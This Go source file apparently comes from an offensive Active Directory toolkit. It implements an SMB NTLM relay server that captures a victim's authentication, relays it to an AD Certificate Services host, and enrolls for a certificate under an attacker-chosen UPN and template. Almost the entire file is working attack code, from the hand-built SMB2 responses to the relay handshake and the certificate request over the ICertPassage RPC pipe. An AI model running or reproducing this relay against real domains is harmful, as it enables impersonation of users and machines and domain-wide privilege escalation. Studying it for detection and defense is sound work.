package pki

import (
	"crypto"
	"crypto/rand"
	"crypto/rsa"
	"crypto/x509"
	"encoding/binary"
	"fmt"
	"net"
	"time"
)

func buildSMB2NegotiateResponse(securityBlob []byte) []byte {
	nb := make([]byte, 4)
	totalLen := 64 + 64 + len(securityBlob)
	nb[1] = byte(totalLen >> 16)
	nb[2] = byte(totalLen >> 8)
	nb[3] = byte(totalLen)

	hdr := make([]byte, 64)
	hdr[0] = 0xFE
	hdr[1] = 'S'
	hdr[2] = 'M'
	hdr[3] = 'B'
	hdr[4] = 64
	binary.LittleEndian.PutUint16(hdr[12:14], 0x0000)
	hdr[14] = 0x00
	hdr[15] = 0x00
	hdr[16] = 0x01

	body := make([]byte, 64)
	binary.LittleEndian.PutUint16(body[0:2], 65)
	binary.LittleEndian.PutUint16(body[2:4], 0x0001)
	binary.LittleEndian.PutUint16(body[4:6], 0x0210)
	serverGUID := [16]byte{0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07, 0x08, 0x09, 0x0a, 0x0b, 0x0c, 0x0d, 0x0e, 0x0f, 0x10}
	copy(body[8:24], serverGUID[:])
	binary.LittleEndian.PutUint32(body[24:28], 0x00000001)
	binary.LittleEndian.PutUint32(body[28:32], 1048576)
	binary.LittleEndian.PutUint32(body[32:36], 1048576)
	binary.LittleEndian.PutUint32(body[36:40], 1048576)
	now := time.Now()
	fileTime := uint64(now.UnixNano()/100 + 116444736000000000)
	binary.LittleEndian.PutUint64(body[40:48], fileTime)
	binary.LittleEndian.PutUint64(body[48:56], fileTime)

	secOff := uint16(64 + 64)
	secLen := uint16(len(securityBlob))
	binary.LittleEndian.PutUint16(body[56:58], secOff)
	binary.LittleEndian.PutUint16(body[58:60], secLen)

	resp := append(nb, hdr...)
	resp = append(resp, body...)
	resp = append(resp, securityBlob...)
	return resp
}

func buildSMB2SessionSetupResponse(ntlmBlob []byte, sessionID uint64) []byte {
	nb := make([]byte, 4)
	totalLen := 64 + 24 + len(ntlmBlob)
	nb[1] = byte(totalLen >> 16)
	nb[2] = byte(totalLen >> 8)
	nb[3] = byte(totalLen)

	hdr := make([]byte, 64)
	hdr[0] = 0xFE
	hdr[1] = 'S'
	hdr[2] = 'M'
	hdr[3] = 'B'
	hdr[4] = 64
	binary.LittleEndian.PutUint16(hdr[12:14], 0x0001)
	hdr[14] = 0x00
	hdr[15] = 0x00
	hdr[16] = 0x01
	binary.LittleEndian.PutUint64(hdr[40:48], sessionID)

	body := make([]byte, 24)
	binary.LittleEndian.PutUint16(body[0:2], 9)
	binary.LittleEndian.PutUint16(body[2:4], 0x0000)
	secOffset := uint16(64 + 24)
	binary.LittleEndian.PutUint16(body[12:14], secOffset)
	binary.LittleEndian.PutUint16(body[14:16], uint16(len(ntlmBlob)))

	resp := append(nb, hdr...)
	resp = append(resp, body...)
	resp = append(resp, ntlmBlob...)
	return resp
}

func parseSMB2Request(conn net.Conn) ([]byte, uint16, error) {
	nb := make([]byte, 4)
	if _, err := readFull(conn, nb); err != nil {
		return nil, 0, fmt.Errorf("read netbios: %w", err)
	}
	length := int(nb[1])<<16 | int(nb[2])<<8 | int(nb[3])
	if length <= 0 || length > 65536 {
		return nil, 0, fmt.Errorf("invalid SMB packet length: %d", length)
	}
	data := make([]byte, length)
	if _, err := readFull(conn, data); err != nil {
		return nil, 0, fmt.Errorf("read SMB packet: %w", err)
	}
	if len(data) < 14 {
		return nil, 0, fmt.Errorf("packet too short")
	}
	command := binary.LittleEndian.Uint16(data[12:14])
	return data, command, nil
}

func extractNTLMBlobFromSessionSetup(data []byte) []byte {
	if len(data) < 64+24 {
		return nil
	}
	secOffset := int(binary.LittleEndian.Uint16(data[64+12 : 64+14]))
	secLen := int(binary.LittleEndian.Uint16(data[64+14 : 64+16]))
	if secOffset+secLen > len(data) || secLen == 0 {
		return nil
	}
	blob := make([]byte, secLen)
	copy(blob, data[secOffset:secOffset+secLen])
	return blob
}

func extractSessionID(data []byte) uint64 {
	if len(data) < 48 {
		return 0
	}
	return binary.LittleEndian.Uint64(data[40:48])
}

type SMBRelayServer struct {
	ListenerIP   string
	ListenerPort int
	CAHostname   string
	CAName       string
	Template     string
	UPN          string
	done         chan struct{}
}

func RunSMBRelay(caHostname, caName, template, upn string, port int, timeout time.Duration) (*x509.Certificate, crypto.Signer, error) {
	addr := fmt.Sprintf(":%d", port)
	listener, err := net.Listen("tcp", addr)
	if err != nil {
		return nil, nil, fmt.Errorf("listen on %s: %w", addr, err)
	}
	defer listener.Close()

	fmt.Printf("[*] SMB NTLM Relay Server listening on 0.0.0.0:%d\n", port)
	fmt.Printf("[*] Target CA: %s, Template: %s\n", caHostname, template)

	connChan := make(chan net.Conn, 1)
	errChan := make(chan error, 1)

	go func() {
		conn, err := listener.Accept()
		if err != nil {
			errChan <- fmt.Errorf("accept: %w", err)
			return
		}
		connChan <- conn
	}()

	var victimConn net.Conn
	select {
	case victimConn = <-connChan:
	case err := <-errChan:
		return nil, nil, err
	case <-time.After(timeout):
		return nil, nil, fmt.Errorf("relay timed out waiting for victim connection")
	}
	defer victimConn.Close()
	victimConn.SetDeadline(time.Now().Add(30 * time.Second))

	negotiatePacket, cmd, err := parseSMB2Request(victimConn)
	if err != nil {
		return nil, nil, fmt.Errorf("read victim negotiate: %w", err)
	}
	if cmd != 0x0000 {
		return nil, nil, fmt.Errorf("expected SMB2 Negotiate (0x0000), got 0x%04X", cmd)
	}
	_ = negotiatePacket

	negResp := buildSMB2NegotiateResponse([]byte("NTLMSSP\x00\x02\x00\x00\x00"))
	if _, err := victimConn.Write(negResp); err != nil {
		return nil, nil, fmt.Errorf("send negotiate response: %w", err)
	}

	sessionSetup1, cmd, err := parseSMB2Request(victimConn)
	if err != nil {
		return nil, nil, fmt.Errorf("read victim session setup 1: %w", err)
	}
	if cmd != 0x0001 {
		return nil, nil, fmt.Errorf("expected SMB2 SessionSetup (0x0001), got 0x%04X", cmd)
	}

	victimNTLMType1 := extractNTLMBlobFromSessionSetup(sessionSetup1)
	if victimNTLMType1 == nil {
		return nil, nil, fmt.Errorf("no NTLM blob in victim SessionSetup")
	}

	relaySess := &smbSession{}
	relayConn, err := net.DialTimeout("tcp", caHostname+":445", 10*time.Second)
	if err != nil {
		return nil, nil, fmt.Errorf("connect to CA %s:445: %w", caHostname, err)
	}
	defer relayConn.Close()
	relaySess.conn = relayConn
	relayConn.SetDeadline(time.Now().Add(30 * time.Second))

	if err := relaySess.negotiate(); err != nil {
		return nil, nil, fmt.Errorf("SMB negotiate with CA: %w", err)
	}

	challenge, err := relaySess.sessionSetupRelayPhase1(victimNTLMType1)
	if err != nil {
		return nil, nil, fmt.Errorf("relay phase1 (Type1 → Type2): %w", err)
	}

	victimSessionID := extractSessionID(sessionSetup1)
	sessResp1 := buildSMB2SessionSetupResponse(challenge, victimSessionID)
	if _, err := victimConn.Write(sessResp1); err != nil {
		return nil, nil, fmt.Errorf("send session setup response 1: %w", err)
	}

	sessionSetup3, cmd, err := parseSMB2Request(victimConn)
	if err != nil {
		return nil, nil, fmt.Errorf("read victim session setup 3: %w", err)
	}
	if cmd != 0x0001 {
		return nil, nil, fmt.Errorf("expected SMB2 SessionSetup (0x0001), got 0x%04X", cmd)
	}

	victimNTLMType3 := extractNTLMBlobFromSessionSetup(sessionSetup3)
	if victimNTLMType3 == nil {
		return nil, nil, fmt.Errorf("no NTLM blob in victim SessionSetup")
	}

	if err := relaySess.sessionSetupRelayPhase2(victimNTLMType3); err != nil {
		return nil, nil, fmt.Errorf("relay phase2 (Type3 auth): %w", err)
	}

	fmt.Printf("[+] Relay: NTLM authentication relayed successfully to CA %s\n", caHostname)

	if err := relaySess.treeConnect(caHostname, "IPC$"); err != nil {
		return nil, nil, fmt.Errorf("tree connect IPC$: %w", err)
	}
	if err := relaySess.createPipe("cert"); err != nil {
		return nil, nil, fmt.Errorf("open pipe: %w", err)
	}
	if err := rpcBind(relaySess, icertPassageUUID); err != nil {
		return nil, nil, fmt.Errorf("RPC bind: %w", err)
	}

	key, err := rsa.GenerateKey(rand.Reader, 2048)
	if err != nil {
		return nil, nil, fmt.Errorf("generate key: %w", err)
	}

	csrDER, err := GenerateCSR(key, upn, template)
	if err != nil {
		return nil, nil, fmt.Errorf("generate CSR: %w", err)
	}

	attribs := fmt.Sprintf("CertificateTemplate:%s", template)
	certDER, disposition, err := certServerRequestWithFlags(relaySess, caName, attribs, csrDER, crInBinary|crInPKCS10)
	if err != nil {
		return nil, nil, fmt.Errorf("CertServerRequest: %w", err)
	}
	if disposition != crDispIssued {
		return nil, nil, fmt.Errorf("enrollment failed (disposition=%d)", disposition)
	}

	cert, err := x509.ParseCertificate(certDER)
	if err != nil {
		return nil, nil, fmt.Errorf("parse certificate: %w", err)
	}

	fmt.Printf("[+] Relay: Certificate obtained for %s via relayed enrollment!\n", upn)

	return cert, key, nil
}
